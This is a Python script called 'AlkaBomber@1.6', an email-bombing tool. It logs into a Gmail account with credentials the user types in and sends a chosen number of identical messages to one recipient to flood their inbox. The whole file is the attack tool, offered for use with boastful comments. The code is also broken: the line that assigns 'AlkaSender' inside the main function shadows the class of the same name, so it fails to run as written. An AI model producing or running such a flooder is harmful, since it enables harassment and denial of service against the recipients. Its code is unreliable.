# - AlkaBomber@1.6
# - By Alka i love u guys !
# - Best Bomber ever !
# - Github : https://github.com/Alkaaaaaaaaaa
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import os
import time
from datetime import datetime

try:
    if os.name == 'nt':  
        os.system("title AlkaBomber@1.6")
    else:  
        os.system("echo -ne '\033]0;AlkaBomber@1.6\a'")
except Exception as e:
    print(f"Failed to set console title: {e}")

TimeBaby = datetime.now().strftime("%H:%M:%S")

class Color:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'

alka_bomber_ascii = f'''{Color.YELLOW}
   ___   ____          ___             __             ___ ____
  / _ | / / /_____ _  / _ )___  __ _  / /  ___ ____  <  // __/
 / __ |/ /  '_/ _ `/ / _  / _ \/  ' \/ _ \/ -_) __/  / // _ \ 
/_/ |_/_/_/\_\\_,_/ /____/\___/_/_/_/_.__/\__/_/    /_(_)___/ 
____________________________________________________________
            [AlkaBomber@1.6] | [{TimeBaby}]
'''

class AlkaSender:
    def __init__(self, smtp_server, smtp_port, email_user, password):
        self.smtp_server = smtp_server
        self.smtp_port = smtp_port
        self.email_user = email_user
        self.password = password

    def send_email(self, recipient, subject, message):
        msg = MIMEMultipart()
        msg['From'] = self.email_user
        msg['To'] = recipient
        msg['Subject'] = subject
        msg.attach(MIMEText(message, 'plain')) 

        try:
            with smtplib.SMTP(self.smtp_server, self.smtp_port) as server:
                server.starttls() 
                server.login(self.email_user, self.password) 
                server.send_message(msg)  
            return True
        except Exception as e:
            print(f"{Color.RED}[AlkaBomber@1.6] /Error: {str(e)}{Color.RESET}")
            return False

def prompt_for_input(prompt, default=None):
    user_input = input(prompt)
    return user_input.strip() or default 

def get_positive_integer(prompt):
    while True:
        try:
            value = int(prompt_for_input(prompt))
            if value > 0:
                return value
            else:
                print(f"{Color.RED}[AlkaBomber@1.6] /Please enter a positive integer.{Color.RESET}")
        except ValueError:
            print(f"{Color.RED}[AlkaBomber@1.6] /Invalid input. Enter a numeric value.{Color.RESET}")

def Alka_clear():
    os.system("cls" if os.name == "nt" else "clear")  

def Alka_main():
    smtp_server = 'smtp.gmail.com'
    smtp_port = 587

    email_user = prompt_for_input(f"{Color.CYAN}[AlkaBomber@1.6] /Your email: {Color.WHITE}", "AlkaBomber@gmail.com")
    password = prompt_for_input(f"{Color.CYAN}[AlkaBomber@1.6] /Your email password: {Color.WHITE}", "Alka-Password")

    AlkaSender = AlkaSender(smtp_server, smtp_port, email_user, password)

    while True:
        recipient = prompt_for_input(f"{Color.CYAN}[AlkaBomber@1.6] /Recipient's email: {Color.WHITE}")
        subject = prompt_for_input(f"{Color.CYAN}[AlkaBomber@1.6] /Email subject: {Color.WHITE}")
        message = prompt_for_input(f"{Color.CYAN}[AlkaBomber@1.6] /Email message: {Color.WHITE}")
        number_of_emails = get_positive_integer(f"{Color.CYAN}[AlkaBomber@1.6] /How many emails to send? {Color.WHITE}")

        print(f"{Color.YELLOW}[AlkaBomber@1.6] /Sending {number_of_emails} emails...{Color.RESET}")
        
        successful_sends = 0
        failed_sends = 0
        delay_between_emails = 5  

        for _ in range(number_of_emails):
            if AlkaSender.send_email(recipient, subject, message):
                successful_sends += 1
                print(f'{Color.GREEN}[AlkaBomber@1.6] /Email successfully sent to: {Color.RED}{recipient}{Color.RESET}')
            else:
                failed_sends += 1
            
            time.sleep(delay_between_emails)  

        print(f"{Color.CYAN}[AlkaBomber@1.6] /Emails sent! {successful_sends} sent, {failed_sends} failed.{Color.RESET}")
        time.sleep(3)
        Alka_clear()
        print(alka_bomber_ascii) 

if __name__ == "__main__":
    Alka_clear() 
    print(alka_bomber_ascii)  
    Alka_main()  
